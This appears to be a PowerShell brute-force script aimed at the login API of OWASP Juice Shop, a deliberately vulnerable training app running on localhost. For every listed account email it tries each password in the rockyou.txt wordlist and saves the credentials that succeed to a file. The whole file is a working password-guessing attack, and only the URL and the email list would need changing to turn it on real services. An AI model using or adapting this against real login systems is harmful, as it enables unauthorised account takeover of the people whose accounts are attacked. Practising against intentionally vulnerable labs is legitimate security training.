cls
$url = 'http://localhost:3000/rest/user/login'
$emails = @('admin@juice-sh.op','jim@juice-sh.op','bender@juice-sh.op','bjoern.kimminich@gmail.com','ciso@juice-sh.op','support@juice-sh.op','morty@juice-sh.op')
$workingObject = @{}
$emails | ForEach-Object {
    $workingObject.Add($_,'')
}
$lastPassLength = 0

New-Item -Name discoveredPasswords.txt -Force -ErrorAction SilentlyContinue | Out-Null
Write-Host "Logins Attempted: " -NoNewline
$LoginsFoundPosition = $host.UI.RawUI.CursorPosition
# $LoginsFoundPosition.Y = $LoginsFoundPosition.Y - 1
Write-Host ""
Write-Host "Trying: " -NoNewline
$passwordPosition = $host.UI.RawUI.CursorPosition
$passwordLineClearCount = $host.UI.RawUI.WindowSize.Width - "Trying: ".Length
Write-Host ""
$origPosition = $host.UI.RawUI.CursorPosition
$host.UI.RawUI.CursorPosition = $origPosition

function Set-Position
{
    param(
        [switch]$Tab,
        [switch]$Reset,
        [switch]$Password,
        [switch]$Logins
    )

    if($Tab)
    {
        $modifiedPosition = $host.UI.RawUI.CursorPosition
        $modifiedPosition.X = ($host.UI.RawUI.CursorPosition.X = ($host.UI.RawUI.WindowSize.Width / 3))
        $host.UI.RawUI.CursorPosition = $modifiedPosition
    }
    if($Reset)
    {
        $host.UI.RawUI.CursorPosition = $origPosition
    }
    if($Password)
    {
        $host.UI.RawUI.CursorPosition = $passwordPosition
        1..$lastPassLength | ForEach-Object {Write-Host " " -NoNewline}
        $host.UI.RawUI.CursorPosition = $passwordPosition
    }
    if($Logins)
    {
        $host.UI.RawUI.CursorPosition = $LoginsFoundPosition
    }
}
try{
    $count = 0
    Get-Content /usr/share/wordlists/rockyou.txt | ForEach-Object {
        
        $count++
        Set-Position -Logins
        Write-Host $count -NoNewline
        $password = $_
        Set-Position -Password
        Write-Host "$password"
        $lastPassLength = $password.Length

        foreach($email in $emails){
            $payload = @{
                'email' = $email
                'password' = $password
            }
            if((Invoke-WebRequest -Uri $url -Method Post -Body $payload -SkipHttpErrorCheck).StatusCode -eq 200){
                $workingObject.$email = ($workingObject.$email,$password | Where-Object {'' -ne $_}) -join ","
                "$($email):$($password)" | Out-File discoveredPasswords.txt -Append
            }
        }   
        $workingObject.Keys | ForEach-Object {
            Write-Host "$_ `t`t`t$($workingObject.$_)"
        }
        Set-Position -Reset
    }
}
finally{
    Set-Position -Reset
    $workingObject.Keys | ForEach-Object {
        Write-Host "$_ `t`t`t$($workingObject.$_)"
    }
    $bottomPosition = $origPosition
    $bottomPosition.Y = $emails.Count + 6
    $host.UI.RawUI.CursorPosition = $bottomPosition
}